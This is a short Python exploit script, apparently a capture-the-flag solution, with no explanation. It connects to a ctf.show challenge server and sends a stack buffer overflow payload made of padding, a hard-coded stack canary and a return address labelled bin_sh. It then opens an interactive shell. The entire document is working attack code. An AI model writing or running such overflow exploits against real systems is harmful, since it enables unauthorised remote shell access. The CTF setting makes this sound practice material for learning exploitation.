from pwn64 import *
sh = remote("pwn.challenge.ctf.show", 28198)
bin_sh = 0x08048696
canary = b'\x33\x36\x44\x21'
payload = b'a'*(0x20) + canary + p32(0x0)*4 + p32(bin_sh)
sh.sendline("1000")
sh.send(payload)
sh.interactive()